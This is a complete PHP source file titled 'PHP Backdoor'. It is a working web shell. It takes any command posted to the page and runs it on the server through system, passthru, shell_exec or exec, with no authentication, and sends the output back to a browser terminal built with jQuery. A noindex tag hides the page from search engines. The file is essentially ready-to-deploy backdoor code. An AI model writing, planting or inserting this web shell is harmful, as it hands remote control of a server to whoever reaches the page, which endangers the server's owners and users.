<?php
/*

	 ██████╗ ██████╗  ██████╗██╗  ██╗    ██████╗ ███████╗██╗   ██╗    ████████╗███████╗ █████╗ ███╗   ███╗
	██╔════╝ ╚════██╗██╔════╝██║ ██╔╝    ██╔══██╗██╔════╝██║   ██║    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
	██║  ███╗ █████╔╝██║     █████╔╝     ██║  ██║█████╗  ██║   ██║       ██║   █████╗  ███████║██╔████╔██║
	██║   ██║ ╚═══██╗██║     ██╔═██╗     ██║  ██║██╔══╝  ╚██╗ ██╔╝       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
	╚██████╔╝██████╔╝╚██████╗██║  ██╗    ██████╔╝███████╗ ╚████╔╝        ██║   ███████╗██║  ██║██║ ╚═╝ ██║
	 ╚═════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝    ╚═════╝ ╚══════╝  ╚═══╝         ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝

	 Project name: PHP Backdoor
	 Description: Web-based application that allows to execute terminal commands on a server directly from a browser
	 Authors: Jarek <jarek@g3ck.com>, G3ck Dev Team <dev@g3ck.com
	 Github: https://g3ck.github.io/PHP-Backdoor
/
	 License: MIT

*/
// Get current command
// if command posted
if (isset( $_POST['command'])):
	$command = $_POST['command'];
	$command = trim($command," ");
else:
// if command not posted. Set '';
	$command = '';
endif;
// decode answer array
function answer($data){
	die(json_encode($data));
}
// Check if is ajax request. If yes, start terminal command
if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest'):
	// Check functions
	// Try: system
	if(function_exists('system'))
	{
		ob_start();
		system($command , $return_var);
		$output = ob_get_contents();
		ob_end_clean();
	}
	// Try: passthru
	else if(function_exists('passthru'))
	{
		ob_start();
		passthru($command , $return_var);
		$output = ob_get_contents();
		ob_end_clean();
	}
	// Try: shell_exec
	else if(function_exists('shell_exec'))
	{
		$output = shell_exec($command);
	}
	// Try: exec
	else if(function_exists('exec'))
	{
		exec($command , $output , $return_var);
		$output = implode("" , $output);
	}

	// Try: terminal_exec
	else if(function_exists('terminal_exec'))
	{
		$output = terminal_exec($command) ;
	}
	// No function exists
	else
	{
		$output = 'Command execution not possible on this server';
	}
	// No output
	if ($output == null):
		$answer = array(
			'Unknown command'
		);
		answer($answer);
	// Create an answer
	else:
		$output = nl2br($output);
		$answer = array(
			$output
		);
		answer($answer);
	endif;
else:
?>
<!doctype html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta name="language" content="en">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<meta name="robots" CONTENT="noindex,nofollow">
	<meta name="distribution" content="IU">
	<meta name="copyright" content="G3ck Dev Team, dev@g3ck.com">
	<meta name="author" content="Jarek, jarek@g3ck.com">
	<meta name="author" content="Jarek, jarek@g3ck.com">
	<meta name="owner" content="G3ck Dev Team, dev@g3ck.com">
	<link href="https://fonts.googleapis.com/css?family=Roboto+Mono:100,300,400,500,700" rel="stylesheet">
	<title>PHP Terminal [g3ck.com]</title>
	<style>
		* {
			font-family: 'Roboto Mono', monospace
		}
		body,
		html {
			height: 100%;
			background: #000;
			font-size: 14px;
			color: #fff;
			padding: 0;
			margin: 0;
			overflow: hidden
		}

		body {
			overflow-x: hidden;
			overflow-y: auto
		}

		section#terminal {
			margin: 15px
		}

		#console {
			list-style: none;
			padding: 0;
			margin: 0
		}

		#console li {
			position: relative;
			width: 99%;
			border: none;
			color: #fff;
			margin-bottom: 1px;
			color: #1dff1d;
			padding: 2px 0 2px 15px
		}

		#console li:not(.answer) {
			cursor: pointer
		}

		#console li::before {
			content: " ~ ";
			position: absolute;
			left: 0;
			top: 1px;
			color: green
		}

		#console li.answer {
			color: #ffd623;
			font-weight: 400
		}

		#console li.answer.error {
			color: #ff2323
		}

		#input {
			padding: 2px 0 2px 15px;
			position: relative
		}

		#input::before {
			content: " ~ ";
			position: absolute;
			left: 0;
			top: 1px;
			color: green
		}

		#input::before {
			transition-property: transform;
			transition-duration: 1s
		}

		#input.waiting::before {
			animation-name: rotate;
			animation-duration: 2s;
			animation-iteration-count: infinite;
			animation-timing-function: linear;
			color: #fff
		}

		@keyframes rotate {
			from {
				transform: rotate(0)
			}
			to {
				transform: rotate(360deg)
			}
		}

		#input #command {
			width: 100%;
			background-color: transparent;
			border: none;
			color: #fff;
			font-size: 14px;
			color: #fff;
			font-family: 'Roboto Mono', monospace
		}
	</style>
</head>
<body>
	<section id="terminal">
		<ul id="console"></ul>
		<div id="input">
			<input id="command" type="text" value="">
		</div>
	</section>
	<script
		src="https://code.jquery.com/jquery-3.3.1.min.js"
		integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
		crossorigin="anonymous"></script>
	<script>
		// Log command into console
		function log(input){
			$("#console").append('<li>' + input + '</li>');
		}
		// Create a answer log
		function answer(input, type=''){
			$("#console").append('<li class="answer ' + type + '">' + input + '</li>');
		}
		// Welcome message
		function welcome(){
			$("#console").append('<li class="answer">PHP Backdoor by G3ck.com</li>');
			$("#console").append('<li class="answer">Licensed under MIT License</li>');
		}
		// Submit a command by jjax
		function ajax(command){
			$.ajax({
				type: "POST",
				dataType:"json",
				// Location = file itself
				url: window.location.href,
				// Set command as post data
				data: "command=" + command,
				beforeSend: function (data) {
					// Waiting for the answer - disable input
					$("#input").addClass('waiting');
					$("#command").prop('disabled', true);
				},
				// Success
				success: function (data)
				{
					// Log answer in console
					// Get answer array and log each line
					$.each(data, function(i, item) {
						answer(item) + ".";
					});
					// Enable input
					setTimeout(function(){
						$("#input").removeClass('waiting');
						$("#command").prop('disabled', false);
					},250);

				},
				// an error occures
				error: function (data)
				{
					answer('unknow command', 'error') + ".";
					setTimeout(function(){
						$("#input").removeClass('waiting');
						$("#command").prop('disabled', false);
					},250);

				}
			});
		}
		// Get welcome message
		welcome();
		// Submit command
		$("#command").on('keyup', function (e) {
			var value = $("#command").val();
			// On enter click
			if (e.keyCode == 13) {
				if (value != ''){
					// Log user command into console
					log(value);
					// Custom command
					// Clear terminal screan
					if (value == 'cls'){
						$("#console").html('');
					// Reset terminal
					} else if (value == 'reset'){
						$("#console").html('');
						welcome();
					} else{
						ajax(value);
					}
					// Scroll terminal to bottom
					$("html, body").animate({ scrollTop: $(document).height() }, "slow");
					$("#command").val('');
				}
				return false;
			}
		});
		$("#command").val('');
		// Copy clicked command
		$(document).on('click','#console li:not(.answer)',function(e) {
			$("#command").val($(this).html());
		});
		// Focus command input
		$(window).click(function() {
			$("#command").focus();
		});
		// Focus command every 0.5 minute
		$(document).ready(function() {
			setTimeout(function(){
					$("#command").focus();
			}, 500);
		});
	</script>
</body>
</html>
<?php endif; ?>
